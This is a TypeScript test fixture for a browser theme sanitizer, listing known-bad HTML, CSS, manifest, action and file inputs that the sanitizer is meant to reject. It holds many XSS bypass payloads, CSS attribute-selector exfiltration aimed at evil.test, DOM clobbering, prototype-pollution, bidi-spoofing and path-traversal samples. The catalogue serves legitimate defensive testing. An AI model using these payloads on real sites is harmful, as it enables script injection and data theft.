// Known-bad theme input, for the sanitizer's unit tests and the browser
// test. Every script payload calls the tripwire `__trip(name)` (or alert);
// every leak payload aims at evil.test. Nothing here may ever run or load.

// A theme template around one payload (the sanitizer needs one root and one
// <m-page>).
export const wrap = (fragment: string) => `<div class="payload-root">${fragment}<m-page></m-page></div>`;

const SVG_EXTERNAL_IMAGE_B64 = (typeof btoa === 'function' ? btoa : (s: string) => Buffer.from(s, 'binary').toString('base64'))(
  "<svg xmlns='http://www.w3.org/2000/svg' onload='parent.__trip(\"svg-data-onload\")'><script>parent.__trip('svg-data-script')</script><image href='https://evil.test/svg-data-image.png' width='10' height='10'/></svg>",
);

// [name, template fragment]
export const HTML_PAYLOADS = [
  ['script', `<script>__trip('script')</script>`],
  ['script src', `<SCRIPT SRC=http://evil.test/xss.js></SCRIPT>`],
  ['script uppercase, spaces', `<ScRiPt >__trip('script-case')</sCrIpT >`],
  ['img onerror', `<img src=x onerror="__trip('img-onerror')">`],
  ['img javascript: src', `<IMG SRC="javascript:__trip('img-js')">`],
  ['img mixed-case javascript:', `<IMG SRC=JaVaScRiPt:__trip('img-case')>`],
  ['on* odd casing', `<img src=x OnErRoR=__trip('odd-case')><div oNmOuSeOvEr="__trip('div-over')">x</div>`],
  ['on* after newline and slash', `<img/src=x\nonerror=__trip('newline')><img src=x/onerror=__trip('slash')>`],
  ['quotes break-out', `<img """><script>__trip('quotes')</script>">`],
  ['decimal entities javascript:', `<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;__trip('entities')">x</a>`],
  ['long decimal entities, no semicolons', `<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058__trip('long')">x</a>`],
  ['hex entities, no semicolons', `<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A__trip('hex')">x</a>`],
  ['tab inside javascript:', `<a href="jav\tascript:__trip('tab')">x</a>`],
  ['encoded tab, newline, CR', `<a href="jav&#x09;ascript:__trip('t')">a</a><a href="jav&#x0A;ascript:__trip('n')">b</a><a href="jav&#x0D;ascript:__trip('r')">c</a>`],
  ['leading control characters and spaces', `<a href=" &#14;  javascript:__trip('leading')">x</a>`],
  ['&colon; and &NewLine;', `<a href="javascript&colon;__trip('colon')">a</a><a href="java&NewLine;script:__trip('nl')">b</a>`],
  ['a href javascript: uppercase', `<a href="JAVASCRIPT:__trip('upper')">x</a>`],
  ['a href data:text/html', `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`],
  ['a href vbscript:', `<a href="vbscript:msgbox(1)">x</a>`],
  ['a href remote, protocol-relative, ping, target', `<a href="https://evil.test/a">a</a><a href="//evil.test/b">b</a><a href="#x" ping="https://evil.test/ping" target="_blank" rel="opener">c</a>`],
  ['a href with leading space before #', `<a href=" #x" >x</a>`],
  ['svg onload', `<svg onload="__trip('svg-onload')"></svg><svg><g onclick="__trip('g')"></g></svg>`],
  ['svg script', `<svg><script>__trip('svg-script')</script></svg>`],
  ['svg script href', `<svg><script href="data:text/javascript,__trip('svg-script-href')"/></svg>`],
  ['svg foreignObject', `<svg><foreignObject><img src=x onerror="__trip('fo')"></foreignObject></svg>`],
  ['svg external use', `<svg><use href="https://evil.test/sprite.svg#a"/><use xlink:href="//evil.test/s.svg#b"/><use href="data:image/svg+xml;base64,PHN2Zy8+#c"/></svg>`],
  ['svg animate href to javascript:', `<svg><a><animate attributeName="href" values="javascript:__trip('animate')"/><text>x</text></a></svg>`],
  ['svg set on*', `<svg><set attributeName="onmouseover" to="__trip('set')"/><animateTransform attributeName="transform"/></svg>`],
  ['svg a href', `<svg><a href="javascript:__trip('svg-a')"><text>x</text></a></svg>`],
  ['svg image and feImage', `<svg><image href="https://evil.test/svg-image.png"/><filter id="f"><feImage href="https://evil.test/feimage.png"/></filter></svg>`],
  ['svg url() fill to remote', `<svg><rect width="5" height="5" fill="url(https://evil.test/fill#p)"/><rect style="fill:url(https://evil.test/fill2#p)"/></svg>`],
  ['svg style element', `<svg><style>@import url(https://evil.test/svg-style.css);</style></svg>`],
  ['mathml mglyph style (DOMPurify mXSS)', `<math><mtext><table><mglyph><style><img src=x onerror="__trip('mathml')">`],
  ['mathml href', `<math href="javascript:__trip('math-href')"><mi>x</mi></math>`],
  ['namespace confusion: svg p style', `<svg></p><style><a id="</style><img src=1 onerror=__trip('ns-confusion')>">`],
  ['namespace confusion: form math', `<form><math><mtext></form><form><mglyph><style></math><img src onerror=__trip('form-math')>`],
  ['noscript title break-out', `<noscript><p title="</noscript><img src=x onerror=__trip('noscript')>">`],
  ['template content', `<template><img src=x onerror="__trip('template')"><script>__trip('template-script')</script></template>`],
  ['template part with script', `<template m-part="palette-row"><button onclick="__trip('part')">x</button></template>`],
  ['iframe javascript: and srcdoc', `<iframe src="javascript:__trip('iframe')"></iframe><iframe srcdoc="<script>parent.__trip('srcdoc')</script>"></iframe>`],
  ['srcdoc on a div', `<div srcdoc="<script>__trip('srcdoc-div')</script>">x</div>`],
  ['object and embed', `<object data="javascript:__trip('object')"></object><embed src="https://evil.test/embed.swf">`],
  ['frameset and frame', `<frameset><frame src="javascript:__trip('frame')"></frameset>`],
  ['link stylesheet and prefetch', `<link rel="stylesheet" href="https://evil.test/x.css"><link rel="prefetch" href="https://evil.test/prefetch">`],
  ['meta refresh', `<meta http-equiv="refresh" content="0;url=javascript:__trip('meta')">`],
  ['base href', `<base href="https://evil.test/">`],
  ['form action and formaction', `<form action="https://evil.test/form"><button formaction="javascript:__trip('formaction')">x</button><input name="q" value="secret"></form>`],
  ['autofocus onfocus on Margin input', `<input m-input="palette" autofocus onfocus="__trip('autofocus')">`],
  ['details ontoggle', `<details open ontoggle="__trip('ontoggle')"><summary>x</summary></details>`],
  ['body onload', `<body onload="__trip('body')">`],
  ['style element with @import', `<style>@import 'https://evil.test/style-el.css';</style>`],
  ['style attribute url() remote', `<div style="background:url(https://evil.test/style-attr)">x</div>`],
  ['style attribute escapes and expression', `<div style="background:u\\72l(https://evil.test/sa-esc);width:expression(__trip('expr'))">x</div>`],
  ['style attribute entity-encoded url', `<div style="background:&#x75;rl(https://evil.test/sa-ent)">x</div>`],
  ['style attribute behavior', `<div style="behavior:url(x.htc);-moz-binding:url(https://evil.test/b.xml#x)">x</div>`],
  ['img remote src variants', `<img src="https://evil.test/i1.png"><img src="//evil.test/i2.png"><img src="/i3.png"><img src="../../../i4.png"><img src="images/../../i5.png"><img src="http:evil.test/i6.png">`],
  ['img srcset', `<img srcset="https://evil.test/srcset.png 1x" alt="">`],
  ['img data:text/html', `<img src="data:text/html,<script>__trip('img-data-html')</script>">`],
  ['img data: svg with script and remote image (kept: images are sandboxed)', `<img alt="" src="data:image/svg+xml;base64,${SVG_EXTERNAL_IMAGE_B64}">`],
  ['nested script tag split', `<scr<script>ipt>__trip('nested')</script>`],
  ['double <', `<<script>script>__trip('double-lt')<</script>/script>`],
  ['comment', `<!--<img src=x onerror=__trip('comment')>-->`],
  ['CDATA', `<![CDATA[<img src=x onerror=__trip('cdata')>]]>`],
  ['processing instruction', `<?xml-stylesheet href="https://evil.test/x.xsl"?>`],
  ['onclick on links and buttons', `<a href="#" onclick="__trip('a-onclick')">a</a><button ONCLICK=__trip('btn')>b</button><button type="submit">c</button>`],
  ['namespaced elements', `<x:script>__trip('ns-script')</x:script><svg:script>__trip('svg-ns')</svg:script><html:img src=x onerror=__trip('html-ns')>`],
  ['xmlns attributes', `<div xmlns="http://www.w3.org/1999/xhtml" xmlns:xlink="http://www.w3.org/1999/xlink">x</div>`],
  ['popover, contenteditable, draggable, name, accesskey', `<button popovertarget="p">x</button><div id="p" popover contenteditable draggable="true" accesskey="x">y</div><img name="cookie" alt="">`],
  ['dialog, select, video, audio, canvas', `<dialog open>x</dialog><select><option>a</option></select><video src="https://evil.test/v.mp4" poster="https://evil.test/p.png"></video><audio src="https://evil.test/a.mp3"></audio><canvas></canvas>`],
  ['picture source', `<picture><source srcset="https://evil.test/src.webp"><img src="x.png"></picture>`],
  ['unknown and custom elements', `<x-evil onclick="__trip('custom')">x</x-evil><blink>y</blink><m-script>__trip('m-script')</m-script><m-action>z</m-action>`],
  ['m-page with content', `<m-page><img src=x onerror=__trip('page-content')></m-page>`],
  ['bindings on href, src, style, on*, class, srcdoc', `<a href="{{tab.url}}">a</a><img src="{{evil.url}}" alt=""><div style="color: {{evil.css}}">b</div><div onclick="{{evil.js}}">c</div><div class="{{evil.cls}}">d</div><div srcdoc="{{evil.html}}">e</div>`],
  ['m-attr on dangerous attributes', `<a href="#" m-attr:href="{{evil.url}}">a</a><img alt="" m-attr:src="{{evil.url}}"><div m-attr:style="{{evil.css}}">b</div><div m-attr:onclick="{{evil.js}}">c</div><div m-attr:ONMOUSEOVER="{{evil.js}}">d</div><div m-attr:srcdoc="{{evil.html}}">e</div><div m-attr:id="{{evil.id}}">f</div>`],
  ['m-style on a real property, or with no binding', `<div m-style:background="{{evil.css}}">a</div><div m-style:--x="url(https://evil.test/m-style-literal)">b</div>`],
  ['m-style variable fed a URL from the view model', `<div class="b" m-style:--evil="{{evil.css}}" style="background:var(--evil)">a</div>`],
  ['m-icon fed a remote URL and javascript:', `<img alt="" m-icon="{{evil.url}}"><img alt="" m-icon="{{evil.remote}}">`],
  ['view-model HTML as text and attribute', `<span class="vm-text">{{evil.html}}</span><div title="{{evil.html}}" aria-label="{{evil.js}}">x</div>`],
  ['expressions and prototype paths in bindings', `<span>{{evil.url.constructor}}</span><span>{{__proto__.polluted}}</span><span>{{ alert(1) }}</span><span>{{evil['url']}}</span><div title="{{constructor.constructor}}">x</div>`],
  ['double interpolation', `<span class="vm-double">{{evil.moustache}}</span>`],
  ['m-for and m-if with bad names', `<m-for each="spaces" as="__proto__"><i>x</i></m-for><m-for each="constructor" as="c"><i>y</i></m-for><m-if test="evil.url.constructor"><i>z</i></m-if>`],
  ['m-action abuse', `<div m-action="tab.close" m-arg="{{evil.id}}">div</div><button m-action="eval" m-arg="__trip('eval')">eval</button><button m-action="__proto__">proto</button><button class="bad-close" m-action="tab.close" m-arg="{{evil.id}}">close</button><button class="bad-proto" m-action="space.switch" m-arg="__proto__">proto</button>`],
];

// A hostile view model's extra branch (merged into the mock's vm).
export const EVIL_VM = {
  url: "javascript:__trip('vm-url')",
  remote: 'https://evil.test/vm-icon.png',
  css: 'url(https://evil.test/vm-css.png)',
  js: "__trip('vm-js')",
  cls: 'x" onmouseover="__trip(1)',
  html: `<img src=x onerror="__trip('vm-html')"><script>__trip('vm-script')</script>`,
  id: 999999,
  moustache: '{{tab.url}}',
};

// [name, css]. After sanitizing, none may mention evil.test, javascript: or
// expression(, and nothing may load.
export const CSS_PAYLOADS = [
  ['@import url()', `@import url(https://evil.test/import-a.css);`],
  ['@import string', `@import 'https://evil.test/import-b.css';`],
  ['@IMPORT uppercase', `@IMPORT "https://evil.test/import-c.css";`],
  ['@import escaped name', `@\\69mport url(https://evil.test/import-d.css); @im\\port 'https://evil.test/import-e.css';`],
  ['@import split by a comment', `@im/**/port url(https://evil.test/import-f.css); @import/**/url(https://evil.test/import-g.css);`],
  ['url() remote', `.a{background:url(https://evil.test/url-a.png)}`],
  ['url() quoted remote', `.a{background:url("https://evil.test/url-b.png")}`],
  ['URL() uppercase, spaces', `.a{background:URL( 'https://evil.test/url-c.png' )}`],
  ['url() protocol-relative and spaces', `.a{background:url(//evil.test/url-d.png)} .b{background:url(   https://evil.test/url-e.png   )}`],
  ['escaped url: u\\72l(', `.a{background:u\\72l(https://evil.test/esc-a.png)}`],
  ['escaped url: \\75 rl(', `.a{background:\\75 rl(https://evil.test/esc-b.png)}`],
  ['escaped URL: \\55\\52\\4c(', `.a{background:\\55\\52\\4c(https://evil.test/esc-c.png)}`],
  ['escapes inside url()', `.a{background:url(https:\\2f\\2f evil.test/esc-d.png)}`],
  ['comment splitting url', `.a{background:ur/**/l(https://evil.test/split-a.png)}`],
  ['comment splitting property name', `.a{back/**/ground:url(https://evil.test/split-b.png)}`],
  ['comment before and after url', `.a{background:/*x*/url(https://evil.test/split-c.png)/**/}`],
  ['comment hiding a brace', `/*}*/.a{background:url(https://evil.test/split-d.png)}`],
  ['HTML comment markers', `<!--.a{background:url(https://evil.test/cdo.png)}-->`],
  ['image-set string', `.a{background-image:image-set("https://evil.test/is-a.png" 1x)}`],
  ['-webkit-image-set url()', `.a{background-image:-webkit-image-set(url(https://evil.test/is-b.png) 1x)}`],
  ['image-set with type()', `.a{background-image:image-set("https://evil.test/is-c.png" type("image/png"))}`],
  ['image-set fed by var()', `.a{--u:"https://evil.test/is-d.png";background-image:image-set(var(--u) 1x)}`],
  ['image-set escaped string', `.a{background-image:image-set("\\68ttps://evil.test/is-e.png" 1x)}`],
  ['image() and cross-fade()', `.a{background-image:image("https://evil.test/img-fn.png")} .b{background-image:cross-fade(url(https://evil.test/cf.png) 50%, red)}`],
  ['src() function', `.a{background-image:src("https://evil.test/src-fn.png")}`],
  ['@font-face remote src', `@font-face{font-family:evilA;src:url(https://evil.test/font-a.woff2)} .a{font-family:evilA}`],
  ['@font-face local then remote', `@font-face{font-family:evilB;src:local(Arial),url(//evil.test/font-b.woff2) format("woff2")} .a{font-family:evilB}`],
  ['@font-face escaped url', `@font-face{font-family:evilC;src:u\\72l(https://evil.test/font-c.woff2)} .a{font-family:evilC}`],
  ['attribute selector exfiltration: input value', `input[value^="a"]{background:url(https://evil.test/exfil-a?a)} input[value^="b"]{background:url(https://evil.test/exfil-a?b)}`],
  ['attribute selector exfiltration: tab data', `[data-url^="https://bank"]{background:url(https://evil.test/exfil-b)} .a[title*="secret"]{background-image:url(https://evil.test/exfil-c)}`],
  ['attribute selector plus var() exfiltration', `[data-url^="https://bank"]{--leak:url(https://evil.test/exfil-d)} .a{background:var(--leak)}`],
  ['url() in every image property', `.a{content:url(https://evil.test/p-content.png);cursor:url(https://evil.test/p-cursor.cur),auto;list-style:url(https://evil.test/p-list.png);mask:url(https://evil.test/p-mask.svg#m);filter:url(https://evil.test/p-filter.svg#f);border-image:url(https://evil.test/p-border.png) 30;shape-outside:url(https://evil.test/p-shape.png)}`],
  ['javascript: and expression()', `.a{background:url(javascript:__trip('css-js'))} .b{width:expression(__trip('expr'))}`],
  ['behavior and -moz-binding', `.a{behavior:url(x.htc)} .b{-moz-binding:url(https://evil.test/binding.xml#x)}`],
  ['@namespace url()', `@namespace url(https://evil.test/ns);`],
  ['url() inside @media, @supports, @container', `@media screen{.a{background:url(https://evil.test/media.png)}} @supports (display:grid){.a{background:url(https://evil.test/supports.png)}} @container (min-width:1px){.a{background:url(https://evil.test/container.png)}}`],
  ['url() in nested rules', `.a{&:hover{background:url(https://evil.test/nest-a.png)} .b{background:url(https://evil.test/nest-b.png)}}`],
  ['@property initial-value url()', `@property --p{syntax:"<url>";inherits:false;initial-value:url(https://evil.test/property.png)} .a{background-image:var(--p)}`],
  ['@keyframes url()', `@keyframes k{from{background:url(https://evil.test/keyframes.png)}} .a{animation:k 1s infinite}`],
  ['custom property url() used elsewhere', `.a{--x:url(https://evil.test/var.png)} .b{background:var(--x)}`],
  ['attr() as a URL', `.a{background-image:attr(data-url url)} .b{background-image:attr(data-url type(<url>))}`],
  ['data:text/html url', `.a{background:url(data:text/html,<script>__trip(1)</script>)}`],
  ['data: svg (utf8) with a remote image', `.a{background:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'><image href='https://evil.test/svg-utf8.png'/></svg>")}`],
  ['data: svg (base64) with script and a remote image: kept, sandboxed', `.a{background:url("data:image/svg+xml;base64,${SVG_EXTERNAL_IMAGE_B64}")}`],
  ['@document, @-moz-document, @page', `@document url-prefix(https://evil.test/){.a{color:red}} @-moz-document url-prefix(){.a{color:red}} @page{margin:0}`],
  ['bad url with parenthesis', `.a{background:url(https://evil.test/bad(paren).png)}`],
  ['unterminated string and url', `.a{background:url("https://evil.test/unterminated.png`],
  ['too many rules', '.a{color:red}'.repeat(5000)],
  ['too large', `.a{color:red}/*${'x'.repeat(300 * 1024)}*/`],
  ['too deep', `${'.a{'.repeat(20)}color:red${'}'.repeat(20)}`],
];

// The page a CSS payload is tried on: the elements its selectors aim at.
export const CSS_TARGET = `<div class="a b tab" title="a secret title" data-url="https://bank.example/account">text<input class="a" value="a"><input class="a" value="b"></div>`;

// [name, action, arg]: all refused.
export const ACTION_PAYLOADS = [
  ['unknown action', 'eval', undefined],
  ['unknown action: destroy', 'tab.destroyAll', undefined],
  ['prototype name: __proto__', '__proto__', undefined],
  ['prototype name: toString', 'toString', undefined],
  ['prototype name: constructor', 'constructor', undefined],
  ['no such tab', 'tab.activate', 999999],
  ['tab id as string', 'tab.activate', '1000'],
  ['tab id negative', 'tab.activate', -1],
  ['tab id fractional', 'tab.activate', 1000.5],
  ['tab id NaN', 'tab.activate', NaN],
  ['tab id object', 'tab.close', { id: 1000 }],
  ['tab id array', 'tab.close', [1000]],
  ['tab id huge string', 'tab.close', 'x'.repeat(1000)],
  ['tab id missing', 'tab.close', undefined],
  ['no such space', 'space.switch', 'nope'],
  ['space with trailing space', 'space.switch', 'personal '],
  ['space __proto__', 'space.switch', '__proto__'],
  ['space constructor', 'space.switch', 'constructor'],
  ['argument to a no-argument action', 'nav.back', 'x'],
  ['object argument to a no-argument action', 'window.close', {}],
  ['moveToSpace with one value', 'tab.moveToSpace', 1000],
  ['moveToSpace with an extra field', 'tab.moveToSpace', { tab: 1000, space: 'work', then: 'tab.close' }],
  ['palette row while closed', 'palette.run', 'row-search'],
  ['no such folder', 'folder.toggle', 'personal-f9'],
  ['no such archived entry', 'archive.restore', 'a9'],
];

// ---------------------------------------------------------------------------
// Phase 6 (docs/phase6-themes.md §4): the payloads PLAN.md §4's rules called
// for that the lists above lacked. Each is refused or removed; none loads,
// runs or shows a theme's words in Margin's guarded parts.

// [name, template fragment, what the sanitizer must say (a RegExp over its
// errors and removed reasons)]
export const TEMPLATE_PAYLOADS_2 = [
  ['svg <use> in a guarded part pointing at <text> outside it', `<svg style="display:none"><symbol id="fake"><text x="0" y="9">Delete everything</text></symbol></svg><template m-part="menu"><div class="menu"><m-for each="menu.items" as="i"><button m-action="menu.run" m-arg="{{i.id}}">{{i.label}}</button></m-for><svg viewBox="0 0 10 10"><use href="#fake"/></svg></div></template>`, /svg use: inside Margin's "menu" part/],
  ['ids named like the overlay\'s globals (DOM clobbering)', `<div id="webkit"></div><div id="marginApp"></div><div id="T"></div><div id="browser"></div><div id="chrome"></div><svg id="safari"></svg><div id="Margin"></div>`, /id: value "webkit" not allowed[\s\S]*named like a global/],
  ['49 levels deep', `${'<div>'.repeat(49)}${'</div>'.repeat(49)}`, /nested deeper than 48/],
  ['49 attributes on an element', `<div ${Array.from({ length: 49 }, (_, i) => `data-a${i}="x"`).join(' ')}>x</div>`, /more than 48 attributes/],
  ['a 4 KB attribute value', `<div title="${'x'.repeat(4097)}">x</div>`, /value too long/],
  ['m-for nested 4 deep', `<m-for each="a" as="b"><m-for each="b.c" as="d"><m-for each="d.e" as="f"><m-for each="f.g" as="h"><i>x</i></m-for></m-for></m-for></m-for>`, /<m-for> nested deeper than 3/],
  ['the same part twice (a decoy second menu)', `<template m-part="menu"><div class="menu">{{menu.title}}</div></template><template m-part="menu"><div class="menu-decoy">{{menu.title}}</div></template>`, /a second template for this part/],
  ['an unknown part name', `<template m-part="evil"><div>x</div></template>`, /unknown part/],
  ['<m-page> inside a part', `<template m-part="palette"><m-page></m-page></template>`, /<m-page> inside <m-for> or <template>/],
];

// [name, css, true if the rule is kept (it loads nothing)]
export const CSS_PAYLOADS_2 = [
  ['url() in clip-path', `.a{clip-path:url(https://evil.test/clip.svg#c)}`],
  ['url() in offset-path', `.a{offset-path:url(https://evil.test/offset.svg#o)}`],
  ['url() in marker-start', `.a{marker-start:url(https://evil.test/marker.svg#m)}`],
  ['url() in mask-border-source', `.a{mask-border-source:url(https://evil.test/mask-border.png)}`],
  ['url() in list-style-image', `.a{list-style-image:url(https://evil.test/list-image.png)}`],
  ['url() in -webkit-box-reflect', `.a{-webkit-box-reflect:below 0 url(https://evil.test/reflect.png)}`],
  ['url() inside @scope', `@scope (.a){.b{background:url(https://evil.test/scope.png)}}`],
  ['url() inside @starting-style', `@starting-style{.a{background:url(https://evil.test/starting.png)}}`],
  ['url() inside @layer', `@layer x{.a{background:url(https://evil.test/layer.png)}}`],
  ['an escaped property name: \\62 ackground', `.a{\\62 ackground:url(https://evil.test/escaped-prop.png)}`],
  ['@counter-style spelling words', `@counter-style evil{system:cyclic;symbols:"D" "e" "l" "e" "t" "e";} .a{list-style:evil}`],
  ['a data: font in @font-face over the cap', `@font-face{font-family:big;src:url(data:font/woff2;base64,${'d09GMg'.repeat(30000)})} .a{font-family:big}`],
];
// Kept on purpose: a data: font under the cap loads nothing (checked live).
export const CSS_KEPT_2 = [
  ['a data: font in @font-face (no request; capped at LIMITS.dataUrl)', `@font-face{font-family:inert;src:url(data:font/woff2;base64,d09GMgABAAAAAA==)} .a{font-family:inert}`],
];

// [name, theme.json text, RegExp over the errors]
export const MANIFEST_PAYLOADS = [
  ['a key twice (the id a first-key reader sees differs)', `{"format":2,"id":"mine","id":"arcadia","name":"X","version":"1.0.0"}`, /appears twice/],
  ['a name with a bidi override', `{"format":2,"id":"mine","name":"Safe\u202Etxt.exe","version":"1.0.0"}`, /bad name/],
  ['an author with an isolate and a zero-width space', `{"format":2,"id":"mine","name":"Mine","version":"1.0.0","author":"Mar\u2066gin\u200b"}`, /bad author/],
  ['not an object', `["format",2]`, /not an object/],
];
// [name, theme.json text, RegExp over the removed reasons]: the theme loads, the bad part removed.
export const MANIFEST_REMOVED = [
  ['__proto__ keys', `{"format":2,"id":"mine","name":"Mine","version":"1.0.0","__proto__":{"polluted":1},"settings":{"__proto__":{"type":"toggle","default":true}}}`, /__proto__: unknown field[\s\S]*settings\.__proto__: bad name/],
  ['deep nesting in an unknown field', `{"format":2,"id":"mine","name":"Mine","version":"1.0.0","extra":${'['.repeat(400)}${']'.repeat(400)}}`, /extra: unknown field/],
];

const bytes = (...parts: (string | number[])[]) => {
  const out: number[] = [];
  for (const p of parts) for (const b of typeof p === 'string' ? [...p].map((c) => c.charCodeAt(0)) : p) out.push(b);
  return new Uint8Array(out);
};
// [name, files, RegExp over checkPackage's errors]
export const FILE_PAYLOADS = [
  ['a "font" that is a script', { 'fonts/evil.woff2': bytes("__trip('font')") }, /isn't a woff2 font/],
  ['a png that is html', { 'images/evil.png': bytes('<html><script>__trip(1)</script>') }, /isn't a png image/],
  ['a jpg that is a png', { 'images/evil.jpg': bytes([0x89], 'PNG\r\n\x1a\n') }, /isn't a jpg image/],
  ['an svg image that is an html page', { 'images/evil.svg': bytes('<html><body><script>__trip(1)</script></body></html>') }, /isn't a svg image/],
  ['an svg image that is not UTF-8', { 'images/evil.svg': bytes('<svg>', [0xff, 0xfe, 0x00], '</svg>') }, /isn't a svg image/],
  ['a note with NUL bytes', { 'NOTES.txt': bytes('hello', [0], 'world') }, /isn't a txt note/],
  ['a note over the cap', { 'NOTES.md': bytes('x'.repeat(64 * 1024 + 1)) }, /note larger than/],
  ['two names that differ by case', { 'images/a.png': bytes([0x89], 'PNG\r\n\x1a\n'), 'images/A.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /same name but for case/],
  ['a parent segment', { 'images/../../evil.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /bad path/],
  ['an absolute path', { '/etc/evil.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /bad path/],
  ['a backslash', { 'images\\evil.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /bad path/],
  ['a drive letter', { 'C:/evil.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /bad path/],
  ['a dot segment', { 'images/./evil.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /bad path/],
  ['a NUL in the path', { 'images/evil\u0000.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /bad path/],
  ['look-alike Unicode (Cyrillic а)', { 'im\u0430ges/evil.png': bytes([0x89], 'PNG\r\n\x1a\n') }, /bad path/],
  ['a hidden file', { '.git/config': bytes('[core]') }, /bad path|not a file a theme may bundle/],
  ['a file a theme may not bundle', { 'evil.js': bytes("__trip('js')") }, /not a file a theme may bundle/],
];
